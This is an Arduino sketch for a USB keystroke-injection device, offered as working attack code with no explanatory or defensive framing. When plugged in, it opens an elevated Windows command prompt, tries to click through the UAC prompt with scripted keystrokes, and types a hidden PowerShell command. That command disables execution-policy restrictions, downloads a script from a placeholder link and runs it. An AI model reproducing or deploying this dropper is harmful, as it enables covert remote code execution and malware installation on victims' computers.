#include "Keyboard.h"

void typeKeyFast(int key){
    Keyboard.press(key);
    delay(10);
    Keyboard.release(key);
}

void startCMD(){
    delay(450);
    Keyboard.begin();
    Keyboard.press(KEY_LEFT_CTRL);
    delay(100);
    Keyboard.press(KEY_ESC);
    delay(100);
    Keyboard.releaseAll();
    delay(300);
    Keyboard.println("cmd");
    Keyboard.press(KEY_LEFT_CTRL);
    delay(140);
    Keyboard.press(KEY_LEFT_SHIFT);
    delay(140);
    typeKeyFast(KEY_RETURN);
    Keyboard.releaseAll();
    delay(1500);
}

void bypassUAC(){
    typeKeyFast(KEY_TAB);
    typeKeyFast(KEY_TAB);
    for (int i = 0; i < 70; i++){
        typeKeyFast(KEY_BACKSPACE);
    }
    typeKeyFast(KEY_RETURN);
    delay(500);
}

void printCommand(){
    Keyboard.println("PowerShell.exe -windowstyle hidden Set-ExecutionPolicy Bypass -Force (new-object System.Net.WebClient).DownloadFile('LINK_HERE', 'b.ps1'); Set-ExecutionPolicy Unrestricted; .\\b.ps1");
    typeKeyFast(KEY_RETURN);
}

void run(){
    startCMD();
    bypassUAC();
    printCommand();
}

void setup() {
    run();
}

void loop() {
    int led2 = 13;
    digitalWrite(led2, LOW);
    delay(120);
    digitalWrite(led2, HIGH);
    delay(120);
}